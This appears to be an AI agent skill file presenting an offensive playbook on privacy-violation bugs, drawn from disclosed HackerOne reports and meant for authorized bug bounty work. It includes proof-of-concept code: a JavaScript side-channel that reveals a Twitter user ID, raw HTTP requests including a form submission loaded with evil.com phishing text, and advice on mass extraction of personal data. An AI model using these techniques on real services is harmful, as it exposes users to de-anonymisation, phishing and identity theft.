---
name: privacy-violation
description: "Privacy Violations offensive playbook from 32 disclosed HackerOne reports (4 high, 19 medium, 9 low). Use when hunting or reviewing privacy violations. Triggers: video, allowed, privacy, nextcloud, after."
license: "For authorized security testing and education only."
---

# Privacy Violations

> Distilled from **32** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

The product exposes or mishandles personal data beyond what the user consented to  -  PII in APIs, cross-user leakage, overly broad exports, or tracking without controls.

## Where to hunt

- Diff API responses for unexpected PII fields; check exports, search, and admin tools for over-collection.
- Test whether one user/tenant can observe another's personal data via IDOR-like or analytics endpoints.

## Exploitation playbook

- Harvest PII from over-broad responses, exports, or shared links; combine with weak access control for mass extraction.

## Bypass techniques

- Secondary channels: logs, emails, webhooks, third-party integrations.

## Impact & escalation

- Regulatory exposure, targeted phishing, identity theft.

## Remediation

- Minimize collected fields, enforce purpose limitation, redact PII in logs, object-level authz on personal data.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#505424](https://hackerone.com/reports/505424)  -  Twitter ID exposure via error-based side-channel attack
*medium, $1,470*

```javascript
var id = 'Your ID'
var script = document.createElement('script');
script.src = `https://developer.twitter.com/api/users/${id}/client-applications.json`;

script.onload = () => console.log('ID match');
script.onerror = e => console.log('ID mismatch');
document.head.appendChild(script);
```

### 2. [#1091957](https://hackerone.com/reports/1091957)  -  Very long names on demo.openmage.org could redirect victim users to…
*medium*

```http
POST /customer/account/createpost/ HTTP/1.1
Host: demo.openmage.org/
Content-Length: 91

Content-Disposition: form-data; name="error_url"
```

### 3. [#3878586](https://hackerone.com/reports/3878586)  -  Unauthenticated team "income/payments" export ignores donor privacy…
*medium, $100*

```http
GET https://liberapay.com/GIMP/income/payments.json HTTP/2
Host: liberapay.com
```

### 4. [#508490](https://hackerone.com/reports/508490)  -  Nextcloud domain and name of every user leaked to lookup server
*medium*

```patch
diff --git a/settings/BackgroundJobs/VerifyUserData.php b/settings/BackgroundJobs/VerifyUserData.php
index 56ebadff9c..76ed8b5ed3 100644
--- a/settings/BackgroundJobs/VerifyUserData.php
+++ b/settings/BackgroundJobs/VerifyUserData.php
@@ -43,10 +43,10 @@ class VerifyUserData extends Job {
	private $retainJob = true;

	/** @var int max number of attempts to send the request */
-	private $maxTry = 24;
+	private $maxTry = PHP_INT_MAX;

	/** @var int how much time should be between two tries (1 hour) */
-	private $interval = 3600;
+	private $interval = 1;

	/** @var AccountManager */
	private $accountManager;
@@ -203,6 +203,7 @@ class VerifyUserData extends Job {

		// ask lookup-server for user data
		$lookupServerData = $this->queryLookupServer($cloudId);
+		printf('Lookup server response for cloudId=%s: %s' . PHP_EOL, $cloudId, print_r($lookupServerData, true));

		// for some reasons we couldn't read any data from the lookup server, try again later
		if (empty($lookupServerData)) {
```

### 5. [#1091957](https://hackerone.com/reports/1091957)  -  Very long names on demo.openmage.org could redirect victim users to…
*medium*

```http
POST /customer/account/createpost/ HTTP/1.1
Host: demo.openmage.org/
Content-Length: 91

Content-Disposition: form-data; name="error_url"


------WebKitFormBoundaryZaGjL6AhSOgUPeQl
Content-Disposition: form-data; name="form_key"

8aHBFidQJt9At8Ux
------WebKitFormBoundaryZaGjL6AhSOgUPeQl
Content-Disposition: form-data; name="firstname"

hello your account has been deleted permanenty please visit here evil.com your account has been blocked permanenty ,please confrim your verification here evil.com
------WebKitFormBoundaryZaGjL6AhSOgUPeQl
Content-Disposition: form-data; name="lastname"

hello your account has been deleted permanenty please visit here evil.com your account has been blocked permanenty ,please confrim your verification here evil.com
------WebKitFormBoundaryZaGjL6AhSOgUPeQl
Content-Disposition: form-data; name="email"

victim-email@address.com
------WebKitFormBoundaryZaGjL6AhSOgUPeQl
Content-Disposition: form-data; name="password"

memek@123
------WebKitFormBoundaryZaGjL6AhSOgUPeQl
Content-Disposition: form-data; name="confirmation"

memek@123
------WebKitFormBoundaryZaGjL6AhSOgUPeQl--
```

### 6. [#3878586](https://hackerone.com/reports/3878586)  -  Unauthenticated team "income/payments" export ignores donor privacy…
*medium, $100*

```sql
LEFT JOIN participants payer ON payer.id = pi.payer AND pt.visibility = 3
```

More payloads: see [payloads.md](payloads.md) (9 curated).

## Recurring patterns in this dataset

Most frequent terms across the 32 reports (term (count)): `video` (14), `allowed` (12), `privacy` (8), `nextcloud` (8), `after` (7), `call` (7), `email` (6), `attacker` (6), `data` (6), `still` (5), `access` (5), `potentially` (5), `disabled` (5), `even` (5), `brute` (5), `force` (5), `talk` (5), `tracking` (5)

## Worked example  -  [report #1067809](https://hackerone.com/reports/1067809)

*Cookie poisoning leads to DOS and Privacy Violation* (high, $700)

> The vulnerability allows for cookie poisoning, leading to denial-of-service and privacy violations.…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#1067809](https://hackerone.com/reports/1067809) | high | $700 | cs_money | Cookie poisoning leads to DOS and Privacy Violation |
| [#1015373](https://hackerone.com/reports/1015373) | high | $560 | x | The Deleted Polls is Still Accessable after 30 Days |
| [#1069039](https://hackerone.com/reports/1069039) | high |  -  | reddit | GPS metadata preserved when converting HEIF to PNG |
| [#273698](https://hackerone.com/reports/273698) | high |  -  | x | Unauthorized Access to Protected Tweets via niche.co API |
| [#434763](https://hackerone.com/reports/434763) | medium | $2,940 | x | Incorrect details on OAuth permissions screen allows DMs to be read without permission |
| [#505424](https://hackerone.com/reports/505424) | medium | $1,470 | x | Twitter ID exposure via error-based side-channel attack |
| [#329957](https://hackerone.com/reports/329957) | medium | $1,120 | x | Tracking of users on third-party websites using the Twitter cookie, due to a flaw in au… |
| [#975047](https://hackerone.com/reports/975047) | medium | $1,000 | shopify | User sensitive information disclosure |

*See [reference.md](reference.md) for all 32 reports in this class.*
